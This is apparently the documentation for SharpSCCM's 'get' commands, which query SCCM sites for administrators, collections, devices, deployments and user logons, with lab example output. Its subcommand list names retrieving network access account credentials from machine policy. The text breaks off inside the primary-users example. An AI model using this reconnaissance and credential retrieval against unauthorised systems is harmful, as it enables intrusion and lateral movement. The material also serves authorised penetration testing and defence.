---
description: get documentation
title: get
---

# Using the "get" Command Group
This documentation was last updated on 4/15/24 by Chris Thompson (@_Mayyhem). Please refer to the output of the `--help` option for each command for the most up-to-date usage information.

### Description
A group of commands that fetch objects from SMS Providers via WMI, management points via HTTP(S), or domain controllers via LDAP

### Usage
```
SharpSCCM get [command] [options]

Options:
  -sc, --site-code <site-code>                The three character site code (e.g., PS1) (default: the site code of the
                                              client running SharpSCCM)
  --debug                                     Print debug messages for troubleshooting
  --no-banner                                 Do not display banner in command output
  -?, -h, --help                              Show help and usage information
```

### Subcommands
```
  admins                        Get information on SCCM administrators and security roles from an SMS Provider via WMI
  applications                  Get information on applications from an SMS Provider via WMI
  classes                       Get a list of WMI classes from an SMS Provider
  class-instances               Get information on WMI class instances from an SMS Provider
  class-properties              Get all properties of a specified WMI class from an SMS Provider
  collections                   Get information on collections from an SMS Provider via WMI
  collection-members            Get the members of a specified collection from an SMS Provider via WMI
  collection-rules              Get the rules that are evaluated to add members to a collection from an SMS Provider via WMI
  deployments                   Get information on deployments from an SMS Provider via WMI
  devices                       Get information on devices from an SMS Provider via WMI
  primary-users                 Get information on primary users set for devices from an SMS Provider via WMI
  resource-id                   Get the resourceID for a username or device from an SMS Provider via WMI
  naa, secrets                  Request the machine policy from a management point via HTTP to obtain credentials for network access accounts, collection variables, and task sequences
  site-info                     Get information about the site, including the site server name, from a domain controller via LDAP
  site-push-settings            Get automatic client push installation settings from an SMS Provider via WMI
  software                      Query a management point for distribution point content locations
  users                         Get information on users from an SMS Provider via WMI
```

---

# get admins

### Description
Get information on SCCM administrators and security roles from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
SharpSCCM get admins [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -i, --id <id>                            A string to search for in collection CollectionIDs (returns all collections where the
                                           CollectionID contains the provided string)
  -n, --name <name>                        A string to search for in collection names (returns all collections where the collections
                                           name contains the provided string)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query (e.g., "Name DESC")
                                           (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p MemberCount"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to connect to (default: the
                                           current management point of the client running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the query (e.g.,
                                           "Name='collection0'" or "Name LIKE '%collection%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code of the client running
                                           SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider for the list of SCCM administrators:
```
.\SharpSCCM.exe get admins -sms localhost -sc cas

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem

[+] Connecting to \\localhost\root\SMS\site_cas
[+] Executing WQL query: SELECT AdminID,AdminSid,DisplayName,LogonName,RoleNames,SourceSite FROM SMS_Admin
-----------------------------------
SMS_Admin
-----------------------------------
AdminID: 16777217
AdminSid: S-1-5-21-622943703-4251214699-2177406285-1108
DisplayName: SCCM Admin
LogonName: MAYYHEM\sccmadmin
RoleNames: Full Administrator
SourceSite: PS1
-----------------------------------
AdminID: 16777241
AdminSid: S-1-5-21-622943703-4251214699-2177406285-1112
DisplayName: Low Priv
LogonName: MAYYHEM\lowpriv
RoleNames: Read-only Analyst, CMPivot Administrator
SourceSite: ps1
-----------------------------------
[+] Completed execution in 00:00:00.6232182
```

---

# get applications

### Description
Get information on applications from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Full Administrator
  - Application Administrator
  - Application Author
  - Application Deployment Manager
  - Operating System Deployment Manager
  - Operations Administrator
  - Read-only Analyst

### Usage
```
  SharpSCCM get applications [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -n, --name <name>                        A string to search for in application names (returns all
                                           applications where the name contains the provided string
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "ResourceID DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p CI_ID
                                           -p LocalizedDisplayName"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "LocalizedDisplayName='app0'" or
                                           "LocalizedDisplayName LIKE '%app%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for applications with names containing "app01":
```
.\SharpSCCM.exe get applications -n app01

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT CI_ID,CI_UniqueID,CreatedBy,DateCreated,ExecutionContext,DateLastModified,IsDeployed,IsEnabled,IsHidden,LastModifiedBy,LocalizedDisplayName,NumberOfDevicesWithApp,NumberOfDevicesWithFailure,NumberOfUsersWithApp,NumberOfUsersWithFailure,SourceSite FROM SMS_Application WHERE LocalizedDisplayName='app01'
-----------------------------------
SMS_Application
-----------------------------------
CI_ID: 16777961
CI_UniqueID: ScopeId_48DB7509-611A-4CA7-985A-E9EF6621930B/Application_c22a8f88-4235-4526-aa4e-15c60883454a/1
CreatedBy: APERTURE\cave.johnson
DateCreated: 20230214013344.000000+000
DateLastModified: 20230214013344.000000+000
ExecutionContext: 0
IsDeployed: False
IsEnabled: True
IsHidden: True
LastModifiedBy: APERTURE\cave.johnson
LocalizedDisplayName: app01
NumberOfDevicesWithApp: 0
NumberOfDevicesWithFailure: 0
NumberOfUsersWithApp: 0
NumberOfUsersWithFailure: 0
SourceSite: PS1
-----------------------------------
[+] Completed execution in 00:00:01.7312188
```

---

# get classes

### Description
Get a list of WMI classes from an SMS Provider

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
  SharpSCCM get classes [options]

Options:
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\SMS\site_<site-code>")
  -sc, --site-code <site-code>         The three character site code (e.g., PS1) (default: the site code of
                                       the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for a list of classes in the default location, `root\SMS\site_<sitecode>`:
```
.\SharpSCCM.exe get classes

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT * FROM meta_class
__AbsoluteTimerInstruction
__ACE
__AggregateEvent
__ClassCreationEvent
__ClassDeletionEvent
<...SNIP...>
SMS_AAD_Application
SMS_AAD_Application_Ex
SMS_AAD_Discovery_Settings
SMS_AAD_Sync_Settings
SMS_AAD_Tenant
SMS_AAD_Tenant_Ex
SMS_AAD_Tenant_Ex_Property
SMS_ActionAccountResult
SMS_ADDomain
SMS_ADForest
SMS_ADForestDiscoveryStatus
SMS_Admin
<...SNIP...>
[+] Completed execution in 00:00:03.3732989
```

---

# get class-instances

### Description
Get information on WMI class instances from an SMS Provider

### Requirements
Permitted security roles:
  - ACLs are applied at the object class and instance level

### Usage
```
  SharpSCCM get class-instances <wmi-class> [options]

Arguments:
  <wmi-class>  The WMI class to query (e.g., "SMS_R_System")

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -n, --wmi-namespace <wmi-namespace>      The WMI namespace to query (default: "root\SMS\site_<site-code>")
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "Name DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           LastLogonUserName"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "LastLogonUserName='cave.johnson'" or
                                           "LastLogonUserName LIKE '%cave%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Query the SMS Provider (default: check if the current management point is one) for the `Name` and `LastLogonUserName` properties for instances of the `SMS_R_System` class where `LastLogonUserName` contains "cave":
```
.\SharpSCCM.exe get class-instances SMS_R_System -p "Name" -p "LastLogonUserName" -w "LastLogonUserName LIKE '%cave%'"

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT ResourceId,Name,LastLogonUserName FROM SMS_R_System WHERE LastLogonUserName LIKE '%cave%'
-----------------------------------
SMS_R_System
-----------------------------------
LastLogonUserName: cave.johnson
Name: CAVE-JOHNSON-PC
-----------------------------------
[+] Completed execution in 00:00:01.4897583
```

---

# get class-properties

### Description
Get all properties of a specified WMI class from an SMS Provider

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
  SharpSCCM get class-properties <wmi-class> [options]

Arguments:
  <wmi-class>  The WMI class to query (e.g., "SMS_R_System")

Options:
  -sms, --sms-provider <sms-provider>  The IP address, FQDN, or NetBIOS name of the SMS Provider to connect
                                       to (default: the current management point of the client running
                                       SharpSCCM)
  -n, --wmi-namespace <wmi-namespace>  The WMI namespace to query (default: "root\SMS\site_<site-code>")
  -sc, --site-code <site-code>         The three character site code (e.g., PS1) (default: the site code of
                                       the client running SharpSCCM)
  --debug                              Print debug messages for troubleshooting
  --no-banner                          Do not display banner in command output
  -?, -h, --help                       Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for the property names for the `SMS_Admin` class:
```
.\SharpSCCM.exe get class-properties SMS_Admin

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
-----------------------------------
SMS_Admin
-----------------------------------
AccountType (UInt32)
AdminID (UInt32)
AdminSid (String)
Categories (String)
CategoryNames (String)
CollectionNames (String)
CreatedBy (String)
CreatedDate (DateTime)
DisplayName (String)
DistinguishedName (String)
ExtendedData (Object)
IsCovered (Boolean)
IsDeleted (Boolean)
IsGroup (Boolean)
LastModifiedBy (String)
LastModifiedDate (DateTime)
LogonName (String)
Permissions (Object)
RoleNames (String)
Roles (String)
SKey (String)
SourceSite (String)
-----------------------------------
[+] Completed execution in 00:00:00.6585959
```

---

# get collections

### Description
Get information on collections from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
  SharpSCCM get collections [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -i, --id <id>                            A string to search for in collection CollectionIDs (returns all
                                           collections where the CollectionID contains the provided string)
  -n, --name <name>                        A string to search for in collection names (returns all
                                           collections where the collections name contains the provided
                                           string)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "Name DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           MemberCount"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "Name='collection0'" or "Name LIKE '%collection%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for the collection with the CollectionID "PS100058":
```
.\SharpSCCM.exe get collections -i PS100058

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT CollectionID,CollectionType,IsBuiltIn,LastMemberChangeTime,LastRefreshTime,LimitToCollectionName,MemberClassName,MemberCount,Name FROM SMS_Collection WHERE CollectionID LIKE '%PS100058%'
-----------------------------------
SMS_Collection
-----------------------------------
CollectionID: PS100058
CollectionType: 1
IsBuiltIn: False
LastMemberChangeTime: 20230131132018.000000+***
LastRefreshTime: 20230131132018.000000+***
LimitToCollectionName: All Users
MemberClassName: SMS_CM_RES_COLL_PS100058
MemberCount: 7
Name: user_be8dcf93-fcc6-4715-9e66-9828efe60cab
-----------------------------------
[+] Completed execution in 00:00:01.2059392
```

---

# get collection-members

### Description
Get the members of a specified collection from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
  SharpSCCM get collection-members [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -d, --device <device>                    The name of the device to get collection membership for (returns
                                           all collection members where the name contains the provided
                                           string)
  -i, --collection-id <collection-id>      The CollectionID of the collection to get members for
  -n, --collection-name <collection-name>  The name of the collection to get members for
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "Name DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           IsActive"
  -r, --resource-id <resource-id>          The unique ResourceID of the device or user to get applicable
                                           rules for
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -u, --user <user>                        The UniqueUserName of the user to get collection membership for
                                           (e.g., "APERTURE\cave.johnson") (returns all collection members
                                           where the name contains the provided string)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "IsActive='True'" or "Name LIKE '%cave-johnson%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Query the SMS Provider (default: check if the current management point is one) for members of the collection named "USERS":
```
.\SharpSCCM.exe get collection-members -n USERS

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Found the USERS collection (PS10004B)
[+] Executing WQL query: SELECT CollectionID,ResourceID,ClientCertType,Domain,IsActive,IsApproved,IsAssigned,IsClient,Name,SiteCode,SMSID FROM SMS_FullCollectionMembership WHERE CollectionID='PS10004B'
-----------------------------------
SMS_FullCollectionMembership
-----------------------------------
ClientCertType:
CollectionID: PS10004B
Domain: APERTURE
IsActive:
IsApproved:
IsAssigned: False
IsClient: False
Name: APERTURE\clientinstall (Client Install)
ResourceID: 2063597570
SiteCode:
SMSID: APERTURE\clientinstall
-----------------------------------
[+] Completed execution in 00:00:02.4711624
```

---

# get collection-rules
### Description
Get the rules that are evaluated to add members to a collection from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
SharpSCCM get collection-rules [options]

Options:
  -d, --device <device>                    The name of the device to get applicable rules for
  -i, --collection-id <collection-id>      The CollectionID of the collection to get applicable rules for
  -n, --collection-name <collection-name>  The name of the collection to get applicable rules for
  -r, --resource-id <resource-id>          The unique ResourceID of the device or user to get applicable
                                           rules for
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -u, --user <user>                        The UniqueUserName of the user to get applicable rules for (e.g.,
                                           "APERTURE\cave.johnson")
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```
### Examples
Query the SMS Provider (default: check if the current management point is one) for collection rules applicable to the device `CAVE-JOHNSON-PC`:
```
.\SharpSCCM.exe get collection-rules -d CAVE-JOHNSON-PC

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Found resource named CAVE-JOHNSON-PC with ResourceID 16777274
[+] Searching for matching collection rules
[+] Found 1 matching collection rule at depth 2 that references other collections
[+] Increasing search depth to 3 and looping through collection rules again to resolve any nested rules
[+] 2 loops remaining
[+] 1 loop remaining
-----------------------------------
CollectionID: SMS00001
Collection Name: All Systems
RuleName: All Systems
QueryID: 1
Query Expression: select * from sms_r_system
-----------------------------------
CollectionID: SMS00001
Collection Name: All Systems
RuleName: All Unknown Computers
QueryID: 2
Query Expression: select SMS_R_UNKNOWNSYSTEM.ResourceID,SMS_R_UNKNOWNSYSTEM.ResourceType,SMS_R_UNKNOWNSYSTEM.Name,SMS_R_UNKNOWNSYSTEM.Name,SMS_R_UNKNOWNSYSTEM.Name from SMS_R_UnknownSystem
-----------------------------------
CollectionID: SMS00001
Collection Name: All Systems
RuleName: All Provisioning Devices
QueryID: 3
Query Expression: select SMS_R_PROVISIONINGSYSTEM.ResourceID,SMS_R_PROVISIONINGSYSTEM.ResourceType,SMS_R_PROVISIONINGSYSTEM.Name,SMS_R_PROVISIONINGSYSTEM.Name,SMS_R_PROVISIONINGSYSTEM.Name from SMS_R_ProvisioningSystem
-----------------------------------
CollectionID: SMS000KM
Collection Name: Co-management Eligible Devices
RuleName: Co-management Eligible Devices
QueryID: 1
Query Expression: select s.* from sms_r_system AS s join sms_G_System_Operating_System AS o ON o.ResourceID = s.ResourceID where s.Client = 1 and s.Decommissioned = 0 and s.Obsolete = 0 and s.ClientType = 1 and s.ClientEdition in (0,7) and (o.ProductType = 1 or o.OperatingSystemSKU = 175) and o.BuildNumber >= 16299
-----------------------------------
CollectionID: SMSDM003
Collection Name: All Desktop and Server Clients
RuleName: All Client Systems
QueryID: 1
Query Expression: select SMS_R_System.ResourceID,SMS_R_System.ResourceType,SMS_R_System.Name,SMS_R_System.SMSUniqueIdentifier,SMS_R_System.ResourceDomainORWorkgroup,SMS_R_System.Client from SMS_R_System where (ClientType = 1) OR (SMS_R_System.AgentEdition0 = 5)
-----------------------------------
CollectionID: SMSDM003
Collection Name: All Desktop and Server Clients
RuleName: All Client Systems
QueryID: 1
Query Expression: select SMS_R_System.ResourceID,SMS_R_System.ResourceType,SMS_R_System.Name,SMS_R_System.SMSUniqueIdentifier,SMS_R_System.ResourceDomainORWorkgroup,SMS_R_System.Client from SMS_R_System where (ClientType = 1) OR (SMS_R_System.AgentEdition0 = 5)
-----------------------------------
CollectionID: PS10004C
Collection Name: DEVICES
RuleName: contains_contains_contains_justcave
IncludeCollectionID: PS10005C
-----------------------------------
CollectionID: PS10004C
Collection Name: DEVICES
RuleName: contains_contains_contains_justcave
QueryID: 5
Query Expression:select SMS_R_SYSTEM.ResourceID,SMS_R_SYSTEM.ResourceType,SMS_R_SYSTEM.Name,SMS_R_SYSTEM.SMSUniqueIdentifier,SMS_R_SYSTEM.ResourceDomainORWorkgroup,SMS_R_SYSTEM.Client from SMS_R_System
-----------------------------------
CollectionID: PS100054
Collection Name: justcave
RuleName: CAVE-JOHNSON-PC
ResourceClassName: SMS_R_System
ResourceID: 16777274
-----------------------------------
CollectionID: PS10005A
Collection Name: contains_justcave
RuleName: justcave
IncludeCollectionID: PS100054
-----------------------------------
CollectionID: PS10005B
Collection Name: contains_contains_justcave
RuleName: contains_justcave
IncludeCollectionID: PS10005A
-----------------------------------
CollectionID: PS10005C
Collection Name: contains_contains_contains_justcave
RuleName: contains_contains_justcave
IncludeCollectionID: PS10005B
-----------------------------------
[+] Completed execution in 00:00:44.4591760
```

---

# get deployments

### Description
Get information on deployments from an SMS Provider via WMI

### Requirements
Permitted security roles:
  - Full Administrator
  - Application Administrator
  - Application Author
  - Application Deployment Manager
  - Operating System Deployment Manager
  - Operations Administrator
  - Read-only Analyst

### Usage
```
SharpSCCM get deployments [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -n, --name <name>                        A string to search for in deployment names (returns all
                                           deployments where the name contains the provided string)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "Name DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           MemberCount"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "Name='collection0'" or "Name LIKE '%collection%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for a list of all deployments:
```
.\SharpSCCM.exe get deployments

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT AssignmentID,ApplicationName,AssignedCI_UniqueID,AssignedCIs,AssignmentName,CollectionName,Enabled,EnforcementDeadline,LastModificationTime,LastModifiedBy,NotifyUser,SourceSite,TargetCollectionID,UserUIExperience FROM SMS_ApplicationAssignment
-----------------------------------
SMS_ApplicationAssignment
-----------------------------------
ApplicationName: app01
AssignedCI_UniqueID: ScopeId_48DB7509-611A-4CA7-985A-E9EF6621930B/Application_c22a8f88-4235-4526-aa4e-15c60883454a/1
AssignedCIs: 16777961
AssignmentName: app01_PS10004C_Install
CollectionName: DEVICES
Enabled: True
EnforcementDeadline: 20230213184800.000000+***
LastModificationTime: 20230214024856.000000+000
LastModifiedBy: APERTURE\cave.johnson
NotifyUser: False
SourceSite: PS1
TargetCollectionID: PS10004C
UserUIExperience: False
-----------------------------------
[+] Completed execution in 00:00:01.8626937
```

---

# get devices

### Description
Get information on devices from an SMS Provider via WMI
  
### Requirements
Permitted security roles:
  - Any (SMS Admins local group)

### Usage
```
SharpSCCM get devices [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -n, --name <name>                        A string to search for in device names (returns all devices where
                                           the device name contains the provided string)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "Name DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p Name -p
                                           LastLogonUserName"
  -u, --last-user <last-user>              Get information on devices where a specific user was the last to
                                           log in (matches exact string provided) (note: output reflects the
                                           last user logon at the point in time the last heartbeat DDR and
                                           hardware inventory was sent to the management point and may not
                                           be accurate)
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "LastLogonUserName='cave.johnson'" or
                                           "LastLogonUserName LIKE '%cave%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for the NetBIOS name and timestamp of last logon for devices where the name of the last user to log on contains "cave.johnson":
```
.\SharpSCCM.exe get devices -p LastLogonTimestamp -p LastLogonUserName -p NetbiosName -u cave.johnson

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |

[+] Querying the local WMI repository for the current management point and site code
[+] Connecting to \\127.0.0.1\root\CCM
[+] Current management point: ATLAS.APERTURE.SCI
[+] Site code: PS1
[+] Connecting to \\ATLAS.APERTURE.SCI\root\SMS\site_PS1
[+] Executing WQL query: SELECT ResourceId,LastLogonTimestamp,LastLogonUserName,NetbiosName FROM SMS_R_System WHERE LastLogonUserName='cave.johnson'
-----------------------------------
SMS_R_System
-----------------------------------
LastLogonTimestamp: 20230206211324.000000+***
LastLogonUserName: cave.johnson
NetbiosName: CAVE-JOHNSON-PC
-----------------------------------
[+] Completed execution in 00:00:01.4308741
```

---

# get primary-users
### Description
Get information on primary users set for devices from an SMS Provider via WMI
  
### Requirements
Permitted security roles:
  - Full Administrator
  - Application Administrator
  - Application Deployment Manager
  - Operations Administrator
  - Read-only Analyst

### Usage
```
SharpSCCM get primary-users [options]

Options:
  -c, --count                              Returns the number of rows that match the specified criteria
  -d, --device <device>                    A specific device to search for (returns the primary user for the
                                           device matching the exact string provided)
  -o, --order-by <order-by>                An ORDER BY clause to set the order of data returned by the query
                                           (e.g., "ResourceID DESC") (default: ascending (ASC) order)
  -p, --properties <properties>            Specify this option for each property to query (e.g., "-p
                                           ResourceName -p UniqueUserName"
  -sms, --sms-provider <sms-provider>      The IP address, FQDN, or NetBIOS name of the SMS Provider to
                                           connect to (default: the current management point of the client
                                           running SharpSCCM)
  -u, --user <user>                        A specific user to search for (returns all devices where the
                                           primary user name contains the provided string)
  -v, --verbose                            Display all class properties and their values
  -w, --where-condition <where-condition>  A WHERE condition to narrow the scope of data returned by the
                                           query (e.g., "UniqueUserName='APERTURE\cave.johnson'" or
                                           "UniqueUserName LIKE '%cave.johnson%'")
  -z, --dry-run                            Display the resulting WQL query but do not connect to the
                                           specified server and execute it
  -sc, --site-code <site-code>             The three character site code (e.g., PS1) (default: the site code
                                           of the client running SharpSCCM)
  --debug                                  Print debug messages for troubleshooting
  --no-banner                              Do not display banner in command output
  -?, -h, --help                           Show help and usage information
```

### Examples
Query the SMS Provider (default: check if the current management point is one) for devices where the name of the primary user contains "cave.johnson":
```
.\SharpSCCM.exe get primary-users -u cave.johnson

  _______ _     _ _______  ______  _____  _______ _______ _______ _______
  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
